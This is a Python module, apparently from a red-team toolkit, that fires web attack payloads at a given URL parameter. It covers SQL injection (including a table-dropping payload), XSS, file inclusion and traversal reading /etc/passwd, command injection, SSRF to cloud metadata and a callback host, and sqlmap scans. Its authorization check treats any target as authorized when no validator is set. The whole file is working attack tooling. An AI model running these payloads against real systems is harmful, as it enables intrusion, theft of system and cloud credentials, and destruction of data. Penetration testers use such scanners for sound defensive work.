"""RED TEAM - Web Exploitation
AUTHORIZED USE ONLY - For penetration testing in controlled lab environments
"""
import logging
import subprocess
import requests
from typing import Dict, List, Optional, Any
from urllib.parse import urlencode

logger = logging.getLogger("PROMETHEUS-PRIME.RedTeam.WebExploits")

class WebExploits:
    """Web exploitation techniques for authorized penetration testing"""

    def __init__(self, scope_validator=None, authorization_required=True):
        self.logger = logger
        self.authorization_required = authorization_required
        self.scope_validator = scope_validator
        self.logger.info("WebExploits module initialized - AUTHORIZED PENTESTING ONLY")

    def _check_authorization(self, target: str, method: str) -> bool:
        if not self.authorization_required:
            return True
        if self.scope_validator:
            authorized = self.scope_validator.validate(target, method)
            if not authorized:
                raise PermissionError(f"Target not in authorized scope")
            return True
        self.logger.warning("No scope validator - assuming authorized")
        return True

    def sql_injection_test(self, url: str, parameter: str) -> Dict[str, Any]:
        """Test for SQL injection vulnerabilities"""
        self._check_authorization(url, "sql_injection")
        try:
            payloads = ["'", "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users--"]
            results = []

            for payload in payloads:
                test_url = f"{url}?{parameter}={payload}"
                response = requests.get(test_url, timeout=10)

                error_indicators = ["sql", "mysql", "sqlite", "postgresql", "oracle", "syntax error"]
                sql_error_found = any(indicator in response.text.lower() for indicator in error_indicators)

                results.append({
                    "payload": payload,
                    "status_code": response.status_code,
                    "sql_error_detected": sql_error_found
                })

            vulnerable = any(r["sql_error_detected"] for r in results)

            return {
                "method": "sql_injection_test",
                "status": "complete",
                "url": url,
                "parameter": parameter,
                "vulnerable": vulnerable,
                "results": results
            }
        except Exception as e:
            return {"method": "sql_injection", "status": "failed", "error": str(e)}

    def sqlmap_scan(self, url: str, data: str = None) -> Dict[str, Any]:
        """Run SQLMap for automated SQL injection testing"""
        self._check_authorization(url, "sqlmap")
        try:
            cmd = ["sqlmap", "-u", url, "--batch", "--level=1", "--risk=1"]
            if data:
                cmd.extend(["--data", data])

            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            return {
                "method": "sqlmap_scan",
                "status": "complete",
                "url": url,
                "output": proc.stdout[:2000]
            }
        except Exception as e:
            return {"method": "sqlmap", "status": "failed", "error": str(e)}

    def xss_test(self, url: str, parameter: str) -> Dict[str, Any]:
        """Test for Cross-Site Scripting (XSS) vulnerabilities"""
        self._check_authorization(url, "xss_test")
        try:
            payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>"
            ]
            results = []

            for payload in payloads:
                test_url = f"{url}?{parameter}={payload}"
                response = requests.get(test_url, timeout=10)

                reflected = payload in response.text

                results.append({
                    "payload": payload,
                    "reflected": reflected,
                    "status_code": response.status_code
                })

            vulnerable = any(r["reflected"] for r in results)

            return {
                "method": "xss_test",
                "status": "complete",
                "url": url,
                "parameter": parameter,
                "vulnerable": vulnerable,
                "results": results
            }
        except Exception as e:
            return {"method": "xss_test", "status": "failed", "error": str(e)}

    def lfi_test(self, url: str, parameter: str) -> Dict[str, Any]:
        """Test for Local File Inclusion (LFI) vulnerabilities"""
        self._check_authorization(url, "lfi_test")
        try:
            payloads = [
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php"
            ]
            results = []

            for payload in payloads:
                test_url = f"{url}?{parameter}={payload}"
                response = requests.get(test_url, timeout=10)

                indicators = ["root:x:", "localhost", "<?php"]
                file_content_found = any(ind in response.text for ind in indicators)

                results.append({
                    "payload": payload,
                    "file_content_found": file_content_found,
                    "response_size": len(response.text)
                })

            vulnerable = any(r["file_content_found"] for r in results)

            return {
                "method": "lfi_test",
                "status": "complete",
                "url": url,
                "parameter": parameter,
                "vulnerable": vulnerable,
                "results": results
            }
        except Exception as e:
            return {"method": "lfi_test", "status": "failed", "error": str(e)}

    def command_injection_test(self, url: str, parameter: str) -> Dict[str, Any]:
        """Test for command injection vulnerabilities"""
        self._check_authorization(url, "command_injection")
        try:
            payloads = [
                "; ls",
                "| whoami",
                "& dir",
                "`id`",
                "$(uname -a)"
            ]
            results = []

            for payload in payloads:
                test_url = f"{url}?{parameter}={payload}"
                response = requests.get(test_url, timeout=10)

                command_indicators = ["uid=", "gid=", "total ", "drwx", "Linux", "Windows"]
                command_executed = any(ind in response.text for ind in command_indicators)

                results.append({
                    "payload": payload,
                    "command_executed": command_executed
                })

            vulnerable = any(r["command_executed"] for r in results)

            return {
                "method": "command_injection_test",
                "status": "complete",
                "url": url,
                "parameter": parameter,
                "vulnerable": vulnerable,
                "results": results
            }
        except Exception as e:
            return {"method": "command_injection", "status": "failed", "error": str(e)}

    def ssrf_test(self, url: str, parameter: str, callback_url: str) -> Dict[str, Any]:
        """Test for Server-Side Request Forgery (SSRF)"""
        self._check_authorization(url, "ssrf_test")
        try:
            payloads = [
                "http://localhost",
                "http://127.0.0.1",
                "http://169.254.169.254/latest/meta-data/",  # AWS metadata
                callback_url
            ]
            results = []

            for payload in payloads:
                test_url = f"{url}?{parameter}={payload}"
                response = requests.get(test_url, timeout=10)

                results.append({
                    "payload": payload,
                    "status_code": response.status_code,
                    "response_size": len(response.text)
                })

            return {
                "method": "ssrf_test",
                "status": "complete",
                "url": url,
                "results": results,
                "note": "Check callback_url logs for SSRF confirmation"
            }
        except Exception as e:
            return {"method": "ssrf_test", "status": "failed", "error": str(e)}

    def directory_traversal_test(self, url: str, parameter: str) -> Dict[str, Any]:
        """Test for directory traversal vulnerabilities"""
        self._check_authorization(url, "dir_traversal")
        try:
            payloads = [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd"
            ]

            results = []
            for payload in payloads:
                test_url = f"{url}?{parameter}={payload}"
                response = requests.get(test_url, timeout=10)

                file_found = "root:x:" in response.text

                results.append({
                    "payload": payload,
                    "file_found": file_found
                })

            vulnerable = any(r["file_found"] for r in results)

            return {
                "method": "directory_traversal_test",
                "status": "complete",
                "url": url,
                "vulnerable": vulnerable,
                "results": results
            }
        except Exception as e:
            return {"method": "dir_traversal", "status": "failed", "error": str(e)}

    def get_capabilities(self) -> List[str]:
        return ["sql_injection_test", "sqlmap_scan", "xss_test", "lfi_test",
                "command_injection_test", "ssrf_test", "directory_traversal_test"]

__all__ = ["WebExploits"]
